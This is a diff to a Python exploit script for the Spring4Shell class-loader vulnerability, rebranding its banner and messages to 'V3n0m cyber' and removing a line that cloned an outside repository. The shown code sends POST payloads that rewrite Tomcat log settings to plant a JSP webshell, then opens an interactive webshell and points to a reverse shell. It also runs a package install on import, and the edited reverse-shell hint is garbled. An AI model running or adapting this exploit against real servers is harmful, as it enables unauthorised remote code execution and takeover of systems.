@@ -1,4 +1,4 @@
-
+#code by V3n0m cyber 
 import os
 import secrets
 import shutil
@@ -127,12 +127,12 @@ def run_exploit(url):
     # If re-running the exploit, this will create an artifact of {old_file_name}_.jsp
     file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
 
-    print("[*] Resetting Log Variables")
+    print("[~] Resetting Log Variables")
     ret = requests.post(url, headers=post_headers, data=file_date_data, verify=False, proxies=proxies)
     if ret.status_code != 200:
         print(f"[!] Cannot reset log variables [{ret.status_code}]. Endpoint might not be vulnerable")
     # Change the tomcat log location variables
-    print("[*] Modifying Log Configurations")
+    print("[~] Modifying Log Configurations")
     ret = requests.post(url, headers=post_headers, data=exp_data, verify=False, proxies=proxies)
     if ret.status_code != 200:
         print(f"[-] Exploit failed [{ret.status_code}]. Cannot modify log configuration")
@@ -144,13 +144,13 @@ def run_exploit(url):
     time.sleep(1)
     
     pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
-    print("[*] Resetting Log Variables")
+    print("[~] Resetting Log Variables")
     requests.post(url, headers=post_headers, data=pattern_data, verify=False, proxies=proxies)
     time.sleep(5)  
     return f"{get_host(url, with_scheme=True)}/{filename}.jsp"
 
 os.system("pip install colorama")
-os.system("git clone https://github.com/V3noM-Cyber/V3nomExplot")
+
 
 
 def main():
@@ -165,19 +165,18 @@ def main():
 ▐█▐█•  ▐█▐▐▌▐█▌.▐▌▐█ ▌▐▌▐█·  ▐▀▀▪▄ ·██·  ██▀·██ ▪ ▐█▌.▐▌▐█· ▐█.▪  
  ███   ██▐█▌▐█▌.▐▌██ ██▌▐█▌  ▐█▄▄▌▪▐█·█▌▐█▪·•▐█▌ ▄▐█▌.▐▌▐█▌ ▐█▌·  
 . ▀    ▀▀ █▪ ▀█▄▀▪▀▀  █▪▀▀▀   ▀▀▀ •▀▀ ▀▀.▀   .▀▀▀  ▀█▄▀▪▀▀▀ ▀▀▀   
-       @exploit V3nom Cyber 
+@exploit V3nom Cyber              #v 1.0
+@devloper Imfor X Halo
  """)
 
-    print("[</>] Running exploit")
+    print("[~] Running exploit")
     shell = run_exploit(host)
-    print(f"[</>] Exploit completed ({shell})")
-    print("[</>] Starting the virtual webshell")
-    time.sleep(1)  # Suspense :D
-    print("[!] To get a reverse shell run 'revsh <your-ip> <your-port>'")
+    print(f"[~] Exploit completed ({shell})")
+    print("[~] Starting the virtual webshell")
+    time.sleep(1) 
+    print("[!] To get a reverse shell run 'http:// <your-ip> <your-port>'")
     term = Term(shell)
     term.cmdloop()
-
-
 if __name__ == "__main__":
     try:
         main()
